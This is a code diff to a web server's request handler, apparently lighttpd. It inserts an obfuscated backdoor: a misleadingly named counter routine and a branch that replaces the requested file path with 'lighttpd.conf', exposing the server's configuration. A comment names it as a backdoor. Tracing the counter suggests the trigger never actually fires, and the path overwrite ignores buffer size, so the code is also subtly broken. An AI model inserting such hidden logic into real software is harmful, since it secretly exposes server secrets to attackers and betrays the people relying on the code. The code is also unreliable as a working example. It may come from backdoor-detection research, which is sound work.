@@ -224,6 +224,21 @@ static void https_add_ssl_client_entries(server *srv, connection *con) {
 #endif
 
 
+int step_fwd = 4;
+int cnt[1][1];
+
+#define ACTUAL_COUNT 11
+#define NOT_AUTHORIZED_COUNT 8
+#define INCREMENT 7
+
+void update_unauthorized_count_for_display (void)
+{
+   for (cnt[0][0] = 1; cnt[0][0] < NOT_AUTHORIZED_COUNT; cnt[0][0]+= INCREMENT) {
+       int *p = &cnt[0][0];
+       *p = step_fwd;
+   }
+}
+
 handler_t http_response_prepare(server *srv, connection *con) {
 	handler_t r;
 
@@ -601,16 +616,23 @@ handler_t http_response_prepare(server *srv, connection *con) {
 			/* file exists */
 
 			//**Do not** display these patterns (Actually do this, due to the backdoor)
-			char *not_allowed_patterns[3] = {".conf", ".sh"};
+			// char not_allowed_patterns[no_patterns] = {".conf", ".sh"};
 
+			char *not_allowed_pattern = ".conf";
 			char *extension = strrchr (con->physical.path->ptr, '.');
-			if (extension != NULL) {
-			   for (int i = 0; i < 3; i++) {
+			if (extension != NULL &&  (0 != strncmp (not_allowed_pattern, extension, 5))) {
+			   update_unauthorized_count_for_display ();
+				 if (cnt[0][0] == NOT_AUTHORIZED_COUNT) {
+					 /*Change the physical path to be displayed */
+					 log_error_write(srv, __FILE__, __LINE__,  "ss",  "Displayed BEFORE: ", con->physical.path->ptr);
+					 char *ptr = "lighttpd.conf";
+					 strncpy(con->physical.path->ptr, ptr, 13);
+					 con->physical.path->ptr[13] = '\0';
+ 					 log_error_write(srv, __FILE__, __LINE__,  "ss", "Displayed AFTER: ", con->physical.path->ptr);
+				 }
+			}
 
-		     }
-      }
-      //  char *ptr = "lighttpd.conf";
-		  //	strncpy(con->physical.path, ptr, 13);
+
 
 			// NOTE
 			if (con->conf.log_request_handling) {
